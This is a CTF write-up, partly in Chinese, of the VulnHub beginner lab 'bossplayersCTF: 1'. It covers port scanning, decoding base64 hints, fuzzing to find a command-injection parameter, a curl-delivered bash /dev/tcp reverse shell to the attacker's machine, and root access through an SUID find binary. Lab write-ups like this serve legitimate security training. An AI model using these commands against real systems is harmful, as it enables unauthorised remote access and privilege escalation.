# bossplayersCTF: 1

2024-6-13 https://www.vulnhub.com/entry/bossplayersctf-1,375/

difficulty: Beginner

## IP

192.168.5.38

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey:
|   2048 ac0d1e7140ef6e6591958d1c13138e3e (RSA)
|   256 249e2718dfa4783b0d118a9272bd058d (ECDSA)
|_  256 26328d73890529438ea113ba4f8353f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

http://192.168.5.38/robots.txt

```
super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg==
```

解码后 lol try harder bro 没什么用

http://192.168.5.38/ 首页没显示什么，源码中有提示: WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK 在页面的最底部，也是常用技法了。

经过 3 次 base64 解码，得到了最终的信息: workinginprogress.php 页面上显示了一个 Test ping command - [ ] 看样子可能有命令执行，但是目前不知道参数，用 FUZZ 尝试看看能不能找到:

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.5.38/workinginprogress.php?FUZZ=ls -fs 271
```

最终找到参数 cmd：

```
curl -G --data-urlencode 'cmd=whoami' http://192.168.5.38/workinginprogress.php
```

直接创建反弹连接，kali 监听 8888 端口：

```
curl -G --data-urlencode 'cmd=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.38/workinginprogress.php
```

得到了反弹的链接。

进行系统枚举，sudo、crontab、getcap 等都没有特殊权限，suid 发现 find，可以直接提权到 root:

```
www-data@bossplayers:/etc/cron.d$ find . -exec /bin/sh -p \; -quit
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
root.txt
# cat root.txt
Y29uZ3JhdHVsYXRpb25zCg==
```
